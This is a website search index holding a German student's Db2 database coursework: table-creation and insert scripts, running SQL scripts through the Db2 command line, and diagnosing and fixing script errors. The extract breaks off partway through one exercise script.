{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Willkommen auf meiner Anleitungsseite!","text":"<p>Ich hei\u00dfe Manuel und auf dieser Seite findest du verschiedene Anleitungen, die ich entweder f\u00fcr meine Schule BBW erstellt habe oder auch f\u00fcr meine privaten Projekte.</p>"},{"location":"#bbw-anleitungen","title":"BBW-Anleitungen","text":"<p>Hier sind einige Anleitungen, die ich f\u00fcr den Einsatz in der Schule BBW erstellt habe:</p> <ul> <li>db2 Aufgabe 2</li> <li>db2 Aufgabe 3</li> <li>M169 Container AWS Fargate</li> </ul>"},{"location":"#private-anleitungen","title":"Private Anleitungen","text":"<p>Hier sind einige Anleitungen, die ich f\u00fcr meine privaten Projekte erstellt habe:</p> <ul> <li>Ticket System</li> <li>wireguard Server</li> <li>Reverse Shell</li> </ul> <p>Vielen Dank f\u00fcr deinen Besuch auf meiner Seite!</p>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-2/","title":"Db2 Hofstetter Aufgabe 2","text":""},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-2/#aufgabe-2","title":"Aufgabe 2","text":""},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-2/#aufgabenstellung","title":"Aufgabenstellung:","text":"<p>In dieser \u00dcbung sollen Sie die folgenden Objekte erstellen. Ziel dieses Auftrages ist es, dass Sie sich mit den entsprechenden CREATE Statements auseinandersetzen und auch lernen wie Sie mit SQL-Fehlern umgehen m\u00fcssen resp. wie Sie diese beheben.</p> <p>Es sollen zwei Tabellen in der Datenbank DBBW001 erstellt werden. F\u00fcr das Erstellen der ben\u00f6tigten Objekte soll der Instanz-User db2inst1 verwendet werden.</p> <p>\u2022 Erstellen Sie eine Tabelle BBWM141.TKLASSE mit folgenden Attributen (die Daten dieser Tabelle sollen physisch im Tablespace SKLASSE gespeichert werden):</p> <p>\u25e6 Die Spalte TKLASSEID soll als Prim\u00e4rschl\u00fcssel definiert werden. Als Datentyp soll INTEGER f\u00fcr diese Spalte gew\u00e4hlt werden.</p> <p>\u25e6 Die Spalte KLASSE ist ein eindeutiger Wert mit der Bezeichnung der Klasse (z.B. 5ip21a, 5ip21b, etc.). F\u00fcr diese Spalte muss immer ein Wert erfasst werden. Als Datentyp soll VARCHAR mit einer maximalen Gr\u00f6sse von 15 Zeichen definiert werden.</p> <p>\u25e6 In der Spalte KLASSENLEHRPERSON soll der Name des zust\u00e4ndigen Klassenlehrers erfasst werden. Als Datentyp soll VARCHAR mit einer maximalen Gr\u00f6sse von 50 Zeichen definiert werden. Das Erfassen dieser Information ist optional.</p> <p>\u25e6 In der Spalte LASTUPDATE soll festgehalten werden WANN dieser Datensatz gespeichert wurde. Dazu soll als Datentyp TIMESTAMP (Datum und Zeit) festgelegt werden. Falls beim Erfassen des Datensatzes kein Wert (Timestamp) angegeben wird, soll der DBM (Database Manager) diesen Wert automatisch einf\u00fcgen.</p> <p>\u2022 Erstellen Sie eine Tabelle BBWM141.TLERNENDE mit folgenden Attributen (die Daten dieser Tabelle sollen physisch im Tablespace SLERNENDER gespeichert werden):</p> <p>\u25e6 TLERNENDEID soll als Prim\u00e4rschl\u00fcssel festgelegt werden. Als Datentyp soll INTEGER f\u00fcr diese Spalte definiert werden. Wird beim Erfassen kein Prim\u00e4rschl\u00fcssel mitgegeben, soll der DBM diesen selbst\u00e4ndig vergeben (IDENTITY).</p> <p>\u25e6 Die Spalte TKLASSEID soll als Fremdschl\u00fcssel definiert werden, damit die Zuteilung eines Lernenden zu einer Klasse m\u00f6glich ist. Das Erfassen der Klasse ist optional. Die Beziehung zwischen den beiden Tabellen soll vom DBM verifiziert werden (RESTRICT Option).</p> <p>\u25e6 Die Spalten NAME und VORNAME sind als VARCHAR Felder mit einer maximalen Gr\u00f6sse von 50 Zeichen zu definieren. Beide Werte m\u00fcssen zwingend erfasst werden. Zus\u00e4tzlich soll f\u00fcr diese beiden Spalten auch ein kombinierter Index (Name und Vorname) definiert werden, damit Abfragen mit den Namen schnell sind.</p> <p>\u25e6 MAILADDR, in diesem Feld soll optional die Mail-Adresse erfasst werden k\u00f6nnen. Eine Mail-Adresse kann maximal 50 Zeichen lang sein.</p> <p>\u25e6 In der Spalte LASTUPDATE soll festgehalten werden WANN dieser Datensatz gespeichert wurde. Dazu soll als Datentyp TIMESTAMP (Datum und Zeit) festgelegt werden. Falls beim Erfassen des Datensatzes kein Wert (Timestamp) angegeben wird, soll der DBM (Database Manager) diesen Wert automatisch einf\u00fcgen. Erstellen Sie dazu folgende drei SQL-Scripts (Files):</p> <p>\u2022 AUFG02D.sql \u2013 in diesem SQL-Script sollen die Objekte vorg\u00e4ngig gel\u00f6scht werden, damit jederzeit eine \"saubere\" Ausgangslage erstellt werden kann.</p> <p>\u2022 AUFG02C.sql \u2013 in diesem SQL-Script sollen alle ben\u00f6tigten Objekte erstellt werden.</p> <p>\u2022 AUFG02INS.sql \u2013 in diesem SQL-Script sollen Sie in beiden Tabellen mittel INSERT Statement mindestens einen Datensatz einf\u00fcgen (z.B. Ihre Klasse und Ihre Personen-Daten).</p>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-2/#scripte","title":"Scripte:","text":"AUFG02D.sql<pre><code>-- L\u00f6schen der Tabellen, falls vorhanden\nDROP TABLE IF EXISTS BBWM141.TLERNENDE;\nDROP TABLE IF EXISTS BBWM141.TKLASSE;\n</code></pre> AUFG02C.sql<pre><code>/*\nCREATE TABLESPACE SKLASSE\n   PAGESIZE 4K\n   MANAGED BY AUTOMATIC STORAGE;\nCREATE TABLESPACE SLERNENDER\n   PAGESIZE 4K\n   MANAGED BY AUTOMATIC STORAGE;  \n*/\n-- Erstellen der Tabelle BBWM141.TKLASSE\nCREATE TABLE BBWM141.TKLASSE (\nTKLASSEID INTEGER NOT NULL GENERATED ALWAYS AS IDENTITY (START WITH 1, INCREMENT BY 1),\nKLASSE VARCHAR(15) NOT NULL,\nKLASSENLEHRPERSON VARCHAR(50),\nLASTUPDATE TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,\nPRIMARY KEY (TKLASSEID)\n) IN SKLASSE;\n-- Erstellen der Tabelle BBWM141.TLERNENDE\nCREATE TABLE BBWM141.TLERNENDE (\nTLERNENDEID INTEGER NOT NULL GENERATED ALWAYS AS IDENTITY (START WITH 1, INCREMENT BY 1),\nTKLASSEID INTEGER,\nNAME VARCHAR(50) NOT NULL,\nVORNAME VARCHAR(50) NOT NULL,\nMAILADDR VARCHAR(50),\nLASTUPDATE TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,\nPRIMARY KEY (TLERNENDEID),\nFOREIGN KEY (TKLASSEID) REFERENCES BBWM141.TKLASSE (TKLASSEID) ON DELETE RESTRICT ON UPDATE NO ACTION\n) IN SLERNENDER;\n-- Erstellen des kombinierten Index f\u00fcr BBWM141.TLERNENDE\nCREATE INDEX IX_TLERNENDE_NAME_VORNAME ON BBWM141.TLERNENDE (NAME, VORNAME);\n</code></pre> AUFG02INS.sql<pre><code>-- Einf\u00fcgen von Daten in BBWM141.TKLASSE\nINSERT INTO BBWM141.TKLASSE (KLASSE, KLASSENLEHRPERSON) VALUES ('5ip21a', 'Max Mustermann');\nINSERT INTO BBWM141.TKLASSE (KLASSE, KLASSENLEHRPERSON) VALUES ('5ip21b', 'Maria Musterfrau');\n-- Einf\u00fcgen eines Datensatzes mit MAILADDR\nINSERT INTO BBWM141.TLERNENDE (NAME, VORNAME, MAILADDR) VALUES ('Schmidt', 'Peter', 'peter.schmidt@example.com');\n-- Einf\u00fcgen eines Datensatzes ohne MAILADDR\nINSERT INTO BBWM141.TLERNENDE (NAME, VORNAME) VALUES ('M\u00fcller', 'Anna');\n-- Einf\u00fcgen eines Datensatzes mit einem nicht existierenden TKlasseID\nINSERT INTO BBWM141.TLERNENDE (NAME, VORNAME, MAILADDR) VALUES ('Bauer', 'Hans', 'hans.bauer@example.com');\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/","title":"Db2 Hofstetter Aufgabe 3","text":""},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#aufgabe-3","title":"Aufgabe 3","text":""},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#aufgabenstellung","title":"Aufgabenstellung:","text":"<p>In der Praxis muss ein DBA (Datenbank-Administrator) f\u00fcr die Wartung von Datenbanken und Applikationen sehr oft SQL-Scripts f\u00fcr mehrere Datenbanken ausf\u00fchren. Das Ausf\u00fchren von SQL-Scripts via einem SQL GUI Client (z.B. DBeaver) l\u00e4sst sich kaum automatisieren und ist zudem auch fehleranf\u00e4llig, da sehr viele manuelle Tasks ausgef\u00fchrt werden m\u00fcssen.</p> <p>Entsprechend wird in der Regel bei Wartungs- und Admin-Aufgaben das CLI verwendet und die Commands oder SQL-Statements werden via dem Command Line Processor (CLP) ausgef\u00fchrt. Eine \u00dcbersicht der verschiedenen Parameter und Optionen des Db2 CLP's haben Sie bereits erhalten (siehe OLAT Verzeichnis 10-Theorie, Dokument M141_Einfuehrung_CLP_V1.2.pdf). Hier nochmals die wichtigsten Parameter des Db2 CLPs f\u00fcr das Ausf\u00fchren eines SQL-Scripts:</p> <p>db2 -tsv -f /bbw/myscripts/meinScript.sql</p> <p>Die Optionen haben dabei folgende Bedeutung:</p> <p>-f file Eingabedatei lesen, die Datei enth\u00e4lt die auszuf\u00fchrenden Statements -t Statements sind mit einem Semikolon (;) terminiert -s Abbruch der Verarbeitung beim ersten Fehler -v Ausgabe des aktuellen Befehls w\u00e4hrend der Ausf\u00fchrungs Fehler (auf stdout)</p> <p>Der CLP gibt bei der Ausf\u00fchrungs Fehler eines Commands oder Statements immer Meldungen aus, via denen ersichtlich ist ob die Ausf\u00fchrungs Fehler erfolgreich war oder ein Fehler aufgetreten ist. Die Messages von Db2 haben eine sogenannte Message-ID (Bsp: DB20000I, DB21034E, SQL0204N, etc.) und einen Message-Text.</p> <p>Bsp: SQL0204N \"MIGDBADM.MYTABLE\" is an undefined name. SQLSTATE=42704</p> <p>Der Suffix einer Message-ID definiert dabei ob es sich um eine Info-, Warning- oder Error-Message handelt.</p> <p>C Indicates a severe or critical error message. E Indicates an urgent error message. The E suffix is for non-SQL messages. N Indicates an error message. W Indicates a warning message. I Indicates an informational message.</p> <p>Da Meldungen oder Message-IDs in Scripts nicht einfach zu interpretieren sind, setzt der Db2 CLP auch einen ExitCode via dem die Ausf\u00fchrungs Fehler protokolliert wird:</p> <p>0 command or SQL statement executed successfully 1 SELECT or FETCH statement returned no rows 2 Db2 command or SQL statement warning 4 Db2 command or SQL statement error 8 Command line processor system error</p> <p>Ein Return-Code wird nur gesetzt wenn ein Script beendet wird oder der interactive Mode des CLPs verlassen wird. Basierend auf dem Exit-Code des CLPs und den verschiedenen CLP Options l\u00e4sst sich das Resultat der Ausf\u00fchrungs Fehler in Shell Scripts sehr einfach verifizieren.</p> <p>Im vorangegangenen Auftrag haben Sie zwei Tabellen erstellt und die zugeh\u00f6rigen SQL-Statements vermutlich via DBeaver ausgef\u00fchrt. In diesem Auftrag sollen Sie nun ausschliesslich mit dem CLP arbeiten.</p> <p>Kopieren Sie aus dem OLAT die folgenden Files auf Ihren DB-Server</p> <p>OLAT-Source-Directory: Unterlagen / Auftr\u00e4ge \u2192 50-Uebungen \u2192 Auftrag-03 Ziel-Verzeichnis auf Server: /bbw/uebungen/ueb03/</p> <p>Zu kopierende Files:</p> <p>UEB03-00.sql leeres File f\u00fcr Vorbereitung und/oder Cleanup UEB03-01.sql Erstellt 2 Tabellen im Schema UEB03A UEB03-02.sql Erstellt 2 Tabellen im Schema UEB03B UEB03-03.sql Erstellt 2 Tabellen im Schema UEB03C UEB03-04.sql Erstellt 16 Tabellen im Schema UEB03D</p> <p>Diese SQL-Scripts sollen nun via CLP ausgef\u00fchrt werden. Sie werden bemerken, dass einige dieser SQL Scripts fehlerhaft sind, d.h. sie m\u00fcssen korrigiert werden oder Sie m\u00fcssen die Voraussetzungen schaffen, dass die Scripts laufen und die Objekte in der Datenbank DBBW001 erstellt werden.</p> <p>Ziel dieser \u00dcbung ist es, dass Sie den Umgang mit dem CLP lernen und auch Fehler-Meldungen interpretieren k\u00f6nnen. Notieren Sie die wesentlichen Punkte, die Sie ausf\u00fchren (Bsp: 1. Login, 2. db2 ....). Die in dieser \u00dcbung erarbeiteten Kompetenzen k\u00f6nnen analog in einer Pr\u00fcfung erforderlich sein.</p> <p>Beispiel: Ausf\u00fchren des SQL-Scripts UEB03-00.sql</p> <p>\u2022 Login mit User db2inst1 via puTTY \u2022 Wechsel ins Directory: /bbw/uebungen/ueb03 \u2022 Ausf\u00fchren des Scripts: db2 -tvsf UEB03-00.sql \u25e6 Oups: SQL1032N No start database manager command was issued. SQLSTATE=57019</p> <p>Anscheinend wurde der DBM noch nicht gestartet ... (Starten Sie den DBM)</p> <p>\u2022 Ausf\u00fchren des Scripts: db2 -tvsf UEB03-00.sql \u25e6 Oups: SQL1024N A database connection does not exist. SQLSTATE=08003</p> <p>Anscheinend haben Sie noch keinen CONNECT ausgef\u00fchrt ... (Machen Sie den CONNECT)</p> <p>\u2022 Ausf\u00fchren des Scripts: db2 -tvsf UEB03-00.sql</p> <p>COMMIT WORK DB20000I The SQL command completed successfully.</p> <p>Fazit:</p> <ol> <li>Kontrollieren ob DBM l\u00e4uft</li> <li>Verbindung zur Datenbank aufbauen mit dem richtigen User (db2 CONNECT TO ...)</li> <li>Ausf\u00fchren des/der SQL-Scripts (db2 -tvsf ...)</li> <li>Kontrolle der Ausgabe (darf keine Fehler-Meldungen enthalten)</li> <li>Verbindung zur Datenbank trennen (db2 CONNECT RESET / db2 TERMINATE)</li> </ol> <p>F\u00fchren Sie nun das Script UEB03-01.sql aus und analysieren Sie den Fehler. Ausf\u00fchren des Scripts: db2 -tvsf UEB03-01.sql</p> <p>Fehler: SQL0204N \"STBDPOSTFILESTREET\" is an undefined name.</p> <p>Der Error SQL0204N bedeutet, dass das referenzierte Objekt in der Datenbank nicht existiert.</p> <p>Der Grund kann dabei ein falscher Name sein (Schreibfehler) oder das Objekt wurde noch nicht erstellt.</p> <p>Hier existiert der Tablespace STBDPOSTFILESTREET noch nicht, d.h. der TABLESPACE muss zuerst mit dem CREATE TABLESPACE Statement angelegt werden (vor dem Erstellen der Tabelle).</p> <p>Erstellen Sie nun den ben\u00f6tigten Tablespace, die Syntax f\u00fcr das CREATE TABLESPACE Statement finden Sie im Knowledge Center (Internet) oder der bereitgestellten PDF-Dokumentation.</p> <p>\u00dcberlegen Sie WO Sie das/die notwendigen SQL Statements einf\u00fcgen (in einem eigenen SQL-Script, im Script UEB03-00.sql oder am Anfang des Files UEB03-01.sql).</p> <p>F\u00fchren Sie die vier SQL-Scripts (UEB03-01.sql bis UEB03-04.sql) aus und analysieren Sie die Fehler-Meldungen. Korrigieren Sie die Scripts, d.h. erstellen Sie die fehlenden Objekte oder korrigieren Sie die Syntax-Fehler.</p> <p>\u00dcberlegen Sie sich auch wie Sie mit den Fehlern umgehen (ev. bricht das Script ja in der H\u00e4lfte ab, d.h. ein Restart ab Beginn ist ev. nicht m\u00f6glich). Baue Sie ein \u201eCleanup-Script\u201c, das alle Objekte zuerst l\u00f6scht (DROP), damit Sie immer eine saubere Ausgangslage bereitstellen k\u00f6nnen.</p> <p>Hier noch ein Hinweis:</p> <ul> <li>wenn Sie eine Tabelle l\u00f6schen, werden auch automatisch alle Indizes der Tabelle gel\u00f6scht</li> <li>wenn Sie einen Tablespace l\u00f6schen werden auch die darin enthaltenen Tabellen, Indizes, etc. gel\u00f6scht</li> </ul>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#beispiel","title":"Beispiel:","text":"<p>Um den DBM (Database Manager) zu starten, m\u00fcssen Sie das folgende Kommando ausf\u00fchren:</p>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#befehl","title":"Befehl:","text":"<pre><code>db2start\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#ausgabe","title":"Ausgabe:","text":"<pre><code>[db2inst1@localhost ueb03]$ db2start\n03/25/2023 14:20:43     0   0   SQL1026N  The database manager is already active.\n</code></pre> <p>Nachdem der DBM erfolgreich gestartet wurde, k\u00f6nnen Sie sich mit dem Datenbank-Server verbinden und das SQL-Skript ausf\u00fchren, indem Sie die folgenden Schritte ausf\u00fchren:</p> <p>Login mit User db2inst1 via puTTY</p> <p>Wechseln Sie ins Verzeichnis: /bbw/uebungen/ueb03</p> <p>Verbinden Sie sich mit dem Datenbank-Server durch Ausf\u00fchren des Befehls:</p>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#befehl_1","title":"Befehl:","text":"<pre><code>db2 connect to &lt;database_name&gt;\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#ausgabe_1","title":"Ausgabe:","text":"<pre><code>[db2inst1@localhost ueb03]$ db2 connect to dbbw001\n\nDatabase Connection Information\n\nDatabase server        = DB2/LINUXX8664 11.5.8.0\n SQL authorization ID   = DB2INST1\n Local database alias   = DBBW001\n</code></pre> <p> ist der Name der Datenbank, mit der Sie sich verbinden m\u00f6chten. <p>F\u00fchren Sie das SQL-Skript aus, indem Sie das folgende Kommando ausf\u00fchren:</p>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#befehl_2","title":"Befehl:","text":"<pre><code>db2 -tvsf UEB03-00.sql\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#ausgabe_2","title":"Ausgabe:","text":"<pre><code>[db2inst1@localhost ueb03]$ db2 -tvsf UEB03-00.sql\nCOMMIT WORK\nDB20000I  The SQL command completed successfully.\n\n******************** END OF SCRIPT ********************\n</code></pre> <p>Wenn das SQL-Skript erfolgreich ausgef\u00fchrt wird, sollte die Meldung \"DB20000I The SQL command completed successfully.\" angezeigt werden.</p> Cleanup.sql<pre><code>-- L\u00f6schen der Tabellen, falls sie existieren\nDROP TABLE IF EXISTS UEB03A.TBDPOSTFILESTREET;\nDROP TABLE IF EXISTS UEB03A.TBDPOSTFILEZIP;\n-- L\u00f6schen der Tablespaces\nDROP TABLESPACE STBDPOSTFILESTREET;\nDROP TABLESPACE STBDPOSTFILEZIP;\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#ueb03-01sql","title":"UEB03-01.sql:","text":""},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#ausfuhrungs-fehler","title":"Ausf\u00fchrungs Fehler:","text":"<pre><code>[db2inst1@localhost ueb03]$ db2 -tvsf UEB03-01.sql\nCREATE TABLE UEB03A.TBDPOSTFILESTREET ( TBDPOSTFILESTREETID  BIGINT NOT NULL GENERATED BY DEFAULT AS IDENTITY( START WITH 1, INCREMENT BY 1, CACHE 100000), STREET               VARCHAR(120), ZIP4                 CHAR(4), ZIPADDON             CHAR(2), ZIP6                 CHAR(6), SHORTCITY            VARCHAR(54), COUNTRY              CHAR(2), ADDRSCANTON          CHAR(2), STREETNR             INTEGER, STREETNRADDON        VARCHAR(6), POLGNAME             VARCHAR(60), POLGCANTON           CHAR(2), BFSNR                INTEGER, LASTUPDATED          TIMESTAMP NOT NULL DEFAULT CURRENT TIMESTAMP ) IN STBDPOSTFILESTREET\nDB21034E  The command was processed as an SQL statement because it was not a\nvalid Command Line Processor command.  During SQL processing it returned:\nSQL0204N  \"STBDPOSTFILESTREET\" is an undefined name.  SQLSTATE=42704\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#zuvor","title":"Zuvor:","text":"UEB03-01.sql<pre><code>-- ------------------------------------------------------------------------------------------------\n-- Dies ist ein Kommentar, d.h. diese Zeile wird NICHT ausgefuehrt\n-- ------------------------------------------------------------------------------------------------\nCREATE TABLE UEB03A.TBDPOSTFILESTREET (\nTBDPOSTFILESTREETID  BIGINT NOT NULL GENERATED BY DEFAULT AS IDENTITY( START WITH 1, INCREMENT BY 1, CACHE 100000),\nSTREET               VARCHAR(120),\nZIP4                 CHAR(4),\nZIPADDON             CHAR(2),\nZIP6                 CHAR(6),\nSHORTCITY            VARCHAR(54),\nCOUNTRY              CHAR(2),\nADDRSCANTON          CHAR(2),\nSTREETNR             INTEGER,\nSTREETNRADDON        VARCHAR(6),\nPOLGNAME             VARCHAR(60),\nPOLGCANTON           CHAR(2),\nBFSNR                INTEGER,\nLASTUPDATED          TIMESTAMP NOT NULL DEFAULT CURRENT TIMESTAMP\n)\nIN STBDPOSTFILESTREET\n;\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.TBDPOSTFILESTREETID IS '''Primary Key''';\nCOMMENT ON COLUMN UEB0A.TBDPOSTFILESTREET.STREET IS 'Street name';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.ZIP4 IS '4 digits of ZIP';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.ZIPADDON IS 'ZIP addon';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.ZIP6 IS 'Full ZIP (6 digits)';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.SHORTCITY IS 'Short city name (27 characters)';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.COUNTRY IS 'Country';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.ADDRSCANTON IS 'Address canton';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.STREETNR IS 'Street no w/o addon';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.STREETNRADDON IS 'Addon (like 22A)';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.POLGNAME IS 'Pol. municipality name';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.POLGCANTON IS 'Municipality canton';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILESTREET.LASTUPDATED IS 'timestamp of last change';\nCREATE TABLE UEB03A.TBDPOSTFILEZIP (\nTBDPOSTFILEZIPID     BIGINT NOT NULL GENERATED BY DEFAULT AS IDENTITY( START WITH 1, INCREMENT BY 1, CACHE 100000),\nZIP4                 CHAR(4),\nZIPADDON             CHAR(2),\nZIP6                 CHAR(6),\nCITY                 VARCHAR(60),\nSHORTCITY            VARCHAR(54),\nCOUNTRY              CHAR(2),\nBFSNR                INTEGER,\nPOLGNAME             VARCHAR(60),\nCANTON               CHAR(2),\nLASTUPDATED          TIMESTAMP NOT NULL DEFAULT CURRENT TIMESTAMP\n)\nIN STBDPOSTFILEZIP\n;\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILEZIP.TBDPOSTFILEZIPID IS '''Primary Key''';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILEZIP.ZIP4 IS '4 digits of ZIP';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILEZIP.ZIPADDON IS 'ZIP addon';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILEZIP.ZIP6 IS 'Full ZIP (6 digits)';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILEZIP.CITY IS 'City name\n';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILEZIP.SHORTCITY IS 'Short city name (27 characters)';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILEZIP.COUNTRY IS 'Country';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILEZIP.POLGNAME IS 'Pol. municipality name';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILEZIP.CANTON IS 'Municipality canton';\nCOMMENT ON COLUMN UEB03A.TBDPOSTFILEZIP.LASTUPDATED IS 'timestamp of last change';\nCREATE UNIQUE INDEX UEB03A.XPKTBDPOSTFILESTRE ON UEB03A.TBDPOSTFILESTREET\n(\nTBDPOSTFILESTREETID            ASC\n);\nCREATE INDEX UEB03A.XIE1TBDPOSTFILESTR ON UEB03A.TBDPOSTFILESTREET\n(\nZIP6                           ASC\n);\nCREATE INDEX UEB03A.XIE2TBDPOSTFILESTR ON UEB03A.TBDPOSTFILESTREET\n(\nSTREET                         ASC,\nZIP6                           ASC,\nSTREETNR                       ASC\n);\nALTER TABLE UEB03A.TBDPOSTFILESTREET  ADD CONSTRAINT XPKTBDPOSTFILESTRE PRIMARY KEY (\nTBDPOSTFILESTREETID\n);\nCREATE INDEX UEB03A.XIE3TBDPOSTFILESTR ON UEB03A.TBDPOSTFILESTREET\n(\nZIP4                           ASC\n);\nCREATE INDEX UEB03A.XIE4TBDPOSTFILESTR ON UEB03A.TBDPOSTFILESTREET\n(\nSTREET                         ASC,\nZIP4                           ASC,\nSTREETNR                       ASC\n);\nCREATE INDEX UEB03A.XIE5TBDPOSTFILESTR ON UEB03A.TBDPOSTFILESTREET\n(\nBFSNR                          ASC\n);\nCREATE UNIQUE INDEX UEB03A.XPKTBDPOSTFILEZIP ON UEB03A.TBDPOSTFILEZIP\n(\nTBDPOSTFILEZIPID               ASC\n);\nALTER TABLE UEB03A.TBDPOSTFILEZIP  ADD CONSTRAINT XPKTBDPOSTFILEZIP PRIMARY KEY (\nTBDPOSTFILEZIPID\n);\nCREATE INDEX UEB03A.XIE1TBDPOSTFILEZIP ON UEB03A.TBDPOSTFILEZIP\n(\nBFSNR                           ASC\n);\nCREATE INDEX UEB03A.XIE2TBDPOSTFILEZIP ON UEB03A.TBDPOSTFILEZIP\n(\nZIP4                           ASC\n);\nCREATE INDEX UEB03A.XIE3TBDPOSTFILEZIP ON UEB03A.TBDPOSTFILEZIP\n(\nZIP6                           ASC\n);\nECHO ******************** END OF SCRIPT ********************; </code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#anpassungen","title":"Anpassungen:","text":"UEB03-01.sql<pre><code>-- Ganz Oben Hinzugef\u00fcgt\nCREATE TABLESPACE STBDPOSTFILESTREET\nPAGESIZE 4096\nMANAGED BY AUTOMATIC STORAGE\n;\nCREATE TABLESPACE STBDPOSTFILEZIP\nPAGESIZE 4096\nMANAGED BY AUTOMATIC STORAGE\n;\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#ueb03-02sql","title":"UEB03-02.sql","text":""},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#ausfuhrungs-fehler_1","title":"Ausf\u00fchrungs Fehler:","text":"<pre><code>COMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ZIP4 IS '4 digits of ZIP' COMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ZIPADDON IS 'ZIP addon'\nDB21034E  The command was processed as an SQL statement because it was not a\nvalid Command Line Processor command.  During SQL processing it returned:\nSQL0104N  An unexpected token \"COMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.\"\nwas found following \"BEGIN-OF-STATEMENT\".  Expected tokens may include:\n\"&lt;space&gt;\".  SQLSTATE=42601\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#zuvor_1","title":"Zuvor:","text":"UEB03-02.sql<pre><code>-- ------------------------------------------------------------------------------------------------\n-- Dies ist ein Kommentar, d.h. diese Zeile wird NICHT ausgefuehrt\n-- ------------------------------------------------------------------------------------------------\n-- disable STOP ON ERROR \nUPDATE COMMAND OPTIONS USING S OFF ; DROP TABLE UEB03B.TBDPOSTFILESTREET;\nDROP TABLE UEB03B.TBDPOSTFILEZIP;\n-- enable STOP ON ERROR again \nUPDATE COMMAND OPTIONS USING S ON ;\nCREATE TABLE UEB03B.TBDPOSTFILESTREET (\nTBDPOSTFILESTREETID  BIGINT NOT NULL GENERATED BY DEFAULT AS IDENTITY( START WITH 1, INCREMENT BY 1, CACHE 100000),\nSTREET               VARCHAR(120),\nZIP4                 CHAR(4),\nZIPADDON             CHAR(2),\nZIP6                 CHAR(6),\nSHORTCITY            VARCHAR(54),\nCOUNTRY              CHAR(2),\nADDRSCANTON          CHAR(2),\nSTREETNR             INTEGER,\nSTREETNRADDON        VARCHAR(6),\nPOLGNAME             VARCHAR(60),\nPOLGCANTON           CHAR(2),\nBFSNR                INTEGER,\nLASTUPDATED          TIMESTAMP NOT NULL DEFAULT CURRENT TIMESTAMP,\nPRIMARY KEY (TBDPOSTFILESTREETID)\n)\nIN STBDPOSTFILESTREET\n;\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.TBDPOSTFILESTREETID IS '''Primary Key''';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.STREET IS 'Street name';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ZIP4 